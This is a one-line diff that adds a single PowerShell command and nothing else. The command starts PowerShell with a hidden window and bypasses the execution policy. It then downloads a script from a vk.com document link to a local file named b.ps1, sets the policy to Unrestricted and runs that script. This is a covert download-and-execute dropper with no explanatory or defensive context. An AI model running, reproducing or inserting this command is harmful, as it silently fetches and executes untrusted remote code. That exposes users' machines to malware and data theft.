@@ -1,0 +1,1 @@
+PowerShell.exe -windowstyle hidden Set-ExecutionPolicy Bypass -Force (new-object System.Net.WebClient).DownloadFile('https://vk.com/doc138418519_492625733', 'b.ps1'); Set-ExecutionPolicy Unrestricted; .\\b.ps1
